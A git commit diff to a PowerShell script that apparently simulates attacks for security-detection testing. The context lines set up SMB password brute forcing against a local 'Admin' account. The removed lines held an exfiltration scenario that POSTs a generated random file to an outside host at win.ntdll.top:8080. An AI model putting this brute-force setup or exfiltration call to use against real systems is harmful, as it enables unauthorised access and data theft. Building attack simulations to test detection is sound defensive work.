b3835a91e776c3ec8321aab397255af36f8cff21
Luke Richards <lrichards@vectranetworks.com>
2020-10-08 16:34:10 +0100

    Updated SMB_Brute_Force.ps1

--- SMB_Brute_Force.ps1
+++ SMB_Brute_Force.ps1
@@ -3,8 +3,6 @@ $pass = 'passwords.txt' #create list of passwords to brute force with, change th
 $user = 'Admin' #local username of the machine that is the smb target, in this case it is just admin even though that account does not exist on the target machine.
 $fileSize = 1048576 # size in bytes, this is 1MB
 $filename = 'testfile.zip' # name of the test file that is generated and transfered
-$uri = 'http://win.ntdll.top:8080'# url to attempt http exfil
-$uploadPath = '/files'# route to try upload to 
 $counter = 0 # do not touch 
 $passcount = (Get-Content $pass).Length # donot touch
 
@@ -33,14 +31,3 @@ foreach($ps in Get-Content $pass) {
     }
 
 } 
-
-Write-Host "Senario 2: File Exfiltration"
-
-
- 
-
-$out = new-object byte[] $fileSize; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes($filename, $out)
-
-Invoke-RestMethod -Uri $uri -Method Post -InFile $filename -EA SilentlyContinue
-
-Remove-Item $filename
